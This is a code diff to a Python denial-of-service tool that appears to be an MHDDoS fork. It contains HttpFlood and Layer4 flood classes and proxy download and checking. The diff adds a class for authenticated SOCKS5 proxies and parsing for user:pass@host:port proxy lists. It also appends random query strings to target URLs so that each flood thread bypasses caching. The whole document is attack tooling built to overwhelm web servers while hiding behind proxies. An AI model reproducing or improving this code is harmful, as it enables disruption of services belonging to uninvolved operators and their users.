@@ -21,11 +21,11 @@ from sys import argv
 from sys import exit as _exit
 from threading import Event, Thread
 from time import sleep, time
-from typing import Any, List, Set, Tuple
+from typing import Any, AnyStr, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
-
-from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
+from PyRoxy.Tools import Patterns
+from PyRoxy import ProxyChecker, ProxySocket, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from certifi import where
 from cloudscraper import create_scraper
@@ -36,6 +36,20 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+from PyRoxy import GeoIP, Tools
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from contextlib import suppress
+from enum import IntEnum, auto
+from ipaddress import ip_address
+from multiprocessing import cpu_count
+from pathlib import Path
+from socket import socket, SOCK_STREAM, AF_INET, gethostbyname
+from typing import AnyStr, Set, Collection, Any
+from yarl import URL
+from PyRoxy import GeoIP, Tools
+from PyRoxy.Exceptions import ProxyInvalidHost, ProxyInvalidPort, ProxyParseError
+import string
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -106,12 +120,111 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+class ProxyConvert(object):
+    user: Any
+    password: Any
+    country: Any
+    port: int
+    type: ProxyType
+    host: AnyStr
+
+    def __init__(self,
+                 host: str,
+                 port: int = 0,
+                 proxy_type: ProxyType = ProxyType.HTTP,
+                 user=None,
+                 password=None):
+        if Patterns.URL.match(host): host = gethostbyname(host)
+        assert self.validate(host, port)
+        self.host = host
+        self.type = proxy_type
+        self.port = port
+        self.country = GeoIP.get(host)
+        try:
+            if self.country:
+                self.country = self.country["registered_country"]["iso_code"]
+        except Exception as e:
+            # print(self.host)
+            # print(self.port)
+            pass
+        # print("user:::",  user)
+        # print("password:::",  password)
+        self.user = user or None
+        self.password = password or None
+
+    def __str__(self):
+        return "%s://%s:%s%s" % (self.type.name.lower(), self.user, self.password, f"@{self.host}:{self.port}" if self.host and self.port else "")
+
+
+    def __repr__(self):
+        return "<%s %s Proxy %s:%s@%s:%d>" % (
+            self.type.name, self.country.upper(), self.user, self.password, self.host, self.port)
+
+    @staticmethod
+    def fromString(string: str):
+        with suppress(Exception):
+            proxy: Any = Patterns.Proxy.search(string)
+            return ProxyConvert(
+                proxy.group(2),
+                int(proxy.group(3))
+                if proxy.group(3) and proxy.group(3).isdigit() else 80,
+                ProxyType.stringToProxyType(proxy.group(1)), proxy.group(4),
+                proxy.group(5))
+        return None
+
+    def ip_port(self):
+        return "%s:%d" % (self.host, self.port)
+
+    @staticmethod
+    def validate(host: str, port: int):
+        with suppress(ValueError):
+            if not ip_address(host):
+                raise ProxyInvalidHost(host)
+            if not Patterns.Port.match(str(port)):
+                raise ProxyInvalidPort(port)
+            return True
+        raise ProxyInvalidHost(host)
+
+    # noinspection PyShadowingBuiltins
+    def open_socket(self,
+                    family=AF_INET,
+                    type=SOCK_STREAM,
+                    proto=-1,
+                    fileno=None):
+        return ProxySocket(self, family, type, proto, fileno)
+
+    def wrap(self, sock: Any):
+        if isinstance(sock, socket):
+            return self.open_socket(sock.family, sock.type, sock.proto,
+                                    sock.fileno())
+        sock.proxies = self.asRequest()
+        return sock
+
+    def asRequest(self):
+        return {
+            "http": self.__str__(),
+            "https": self.__str__().replace("http://", "https://")
+        }
+
+    # noinspection PyUnreachableCode
+    def check(self, url: Any = "https://httpbin.org/get", timeout=5):
+        if not isinstance(url, URL): url = URL(url)
+        with suppress(Exception):
+            with self.open_socket() as sock:
+                sock.settimeout(timeout)
+                sock.connect((url.host, url.port or 80))
+                return True
+        return False
+
 def exit(*message):
     if message:
         logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
     shutdown()
     _exit(1)
 
+def random_string(length):
+    letters = string.ascii_lowercase
+    return ''.join(randchoice(letters) for _ in range(length))
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
@@ -203,11 +316,16 @@ class Tools:
     @staticmethod
     def send(sock: socket, packet: bytes):
         global BYTES_SEND, REQUESTS_SENT
-        if not sock.send(packet):
-            return False
-        BYTES_SEND += len(packet)
-        REQUESTS_SENT += 1
-        return True
+        try:
+            sent_bytes = sock.send(packet)
+            if sent_bytes > 0:
+                BYTES_SEND += sent_bytes
+                REQUESTS_SENT += 1
+                # print("Send success")
+                return True
+        except Exception as e:
+            print(f"Error send: {e}")
+        return False
 
     @staticmethod
     def sendto(sock, packet, target):
@@ -373,14 +491,14 @@ class Layer4(Thread):
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
-    _proxies: List[Proxy] = None
+    _proxies: List[ProxyConvert] = None
 
     def __init__(self,
                  target: Tuple[str, int],
                  ref: List[str] = None,
                  method: str = "TCP",
                  synevent: Event = None,
-                 proxies: Set[Proxy] = None,
+                 proxies: Set[ProxyConvert] = None,
                  protocolid: int = 74):
         Thread.__init__(self, daemon=True)
         self._amp_payload = None
@@ -643,7 +761,7 @@ class Layer4(Thread):
 
 # noinspection PyBroadException,PyUnusedLocal
 class HttpFlood(Thread):
-    _proxies: List[Proxy] = None
+    _proxies: List[ProxyConvert] = None
     _payload: str
     _defaultpayload: Any
     _req_type: str
@@ -664,7 +782,7 @@ class HttpFlood(Thread):
                  synevent: Event = None,
                  useragents: Set[str] = None,
                  referers: Set[str] = None,
-                 proxies: Set[Proxy] = None) -> None:
+                 proxies: Set[ProxyConvert] = None) -> None:
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         self._thread_id = thread_id
@@ -1233,7 +1351,7 @@ class HttpFlood(Thread):
 class ProxyManager:
 
     @staticmethod
-    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
+    def DownloadFromConfig(cf, Proxy_type: int) -> Set[ProxyConvert]:
         providrs = [
             provider for provider in cf["proxy-providers"]
             if provider["type"] == Proxy_type or Proxy_type == 0
@@ -1241,7 +1359,7 @@ class ProxyManager:
         logger.info(
             f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                 providrs))
-        proxes: Set[Proxy] = set()
+        proxes: Set[ProxyConvert] = set()
 
         with ThreadPoolExecutor(len(providrs)) as executor:
             future_to_download = {
@@ -1256,11 +1374,11 @@ class ProxyManager:
         return proxes
 
     @staticmethod
-    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
+    def download(provider, proxy_type: ProxyType) -> Set[ProxyConvert]:
         logger.debug(
             f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
             (provider["url"], proxy_type.name, provider["timeout"]))
-        proxes: Set[Proxy] = set()
+        proxes: Set[ProxyConvert] = set()
         with suppress(TimeoutError, exceptions.ConnectionError,
                       exceptions.ReadTimeout):
             data = get(provider["url"], timeout=provider["timeout"]).text
@@ -1515,7 +1633,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         with proxy_li.open("w") as wr:
-            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+            Proxies: Set[ProxyConvert] = ProxyManager.DownloadFromConfig(con, proxy_ty)
             logger.info(
                 f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
@@ -1534,7 +1652,19 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
                 stringBuilder += (proxy.__str__() + "\n")
             wr.write(stringBuilder)
 
-    proxies = ProxyUtiles.readFromFile(proxy_li)
+    proxies = set()
+    with open(proxy_li, 'r') as file:
+        lines = file.readlines()
+        for line in lines:
+            proxy_data = line.strip()
+            parts = proxy_data.split('@')
+            if len(parts) == 2:
+                username_password, host_port = parts
+                username, password = username_password.split(':')[-2:]
+                host, port = host_port.split(':')
+                proxy = ProxyConvert(host, int(port), ProxyType.SOCKS5, username.replace("//", ""), password)
+                proxies.add(proxy)
+
     if proxies:
         logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
     else:
@@ -1626,8 +1756,10 @@ if __name__ == '__main__':
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                    url_str = f"{str(url)}?{random_string(20)}"
+                    # url_str = f"{str(url)}?sportType=2&type=1&{random_string(10)}=1"
+                    HttpFlood(thread_id, URL(url_str), host, method, rpc, event, uagents, referers, proxies).start()
+                    url_str = None
 
             if method in Methods.LAYER4_METHODS:
                 target = URL(urlraw)
